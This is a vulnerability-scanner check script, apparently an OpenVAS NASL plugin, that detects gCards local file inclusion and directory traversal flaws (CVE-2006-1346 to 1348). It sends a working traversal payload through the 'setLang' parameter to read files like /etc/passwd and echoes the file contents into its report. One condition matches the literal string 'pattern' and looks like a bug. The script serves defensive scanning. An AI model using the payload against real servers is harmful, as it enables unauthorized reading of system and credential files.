if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80065" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2006-1346", "CVE-2006-1347", "CVE-2006-1348" );
	script_bugtraq_id( 17165 );
	script_xref( name: "OSVDB", value: "24016" );
	script_xref( name: "OSVDB", value: "24017" );
	script_xref( name: "OSVDB", value: "24018" );
	script_name( "gCards Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2008 Josh Zlatin-Amishav" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://retrogod.altervista.org/gcards_145_xpl.html" );
	script_xref( name: "URL", value: "http://www.gregphoto.net/index.php/2006/03/27/gcards-146-released-due-to-security-issues/" );
	script_tag( name: "solution", value: "Upgrade to gCards version 1.46 or later." );
	script_tag( name: "summary", value: "The remote web server contains a PHP application that is prone to
  multiple vulnerabilities.

  Description :

  The remote host is running gCards, a free electronic greeting card
  system written in PHP.

  The installed version of gCards fails to sanitize user input to the
  'setLang' parameter in the 'inc/setLang.php' script which is called by
  'index.php'." );
	script_tag( name: "impact", value: "An unauthenticated attacker may be able to exploit this
  issue to read arbitrary local files or execute code from local files subject to the permissions
  of the web server user id.

  There are also reportedly other flaws in the installed application,
  including a directory traversal issue that allows reading of local
  files as well as a SQL injection and a cross-site scripting issue." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/gcards", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	lang = "vuln-test";
	for pattern in keys( files ) {
		file = files[pattern];
		url = NASLString( dir, "/index.php?setLang=", lang, "&lang[", lang, "][file]=../../../../../../../../../../../../" + file );
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(!res){
			continue;
		}
		if(egrep( pattern: ">gCards</a> v.*Graphics by Greg gCards", string: res ) && ( egrep( pattern: "root:.*:0:[01]:", string: res ) || egrep( pattern: "main\\(inc/lang/.+/" + file + "\\).+ failed to open stream: No such file or directory", string: res ) || egrep( pattern: "main.+ open_basedir restriction in effect\\. File\\(\\./inc/lang/.+/" + file + "", string: res ) )){
			if(egrep( pattern: "pattern", string: res )){
				content = res - strstr( res, "<!DOCTYPE HTML PUBLIC" );
			}
			if( content ) {
				report = NASLString( "Here are the contents of the file '/" + file + "' that\\n", "the scanner was able to read from the remote host :\\n", "\\n", content );
			}
			else {
				report = "";
			}
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 0 );

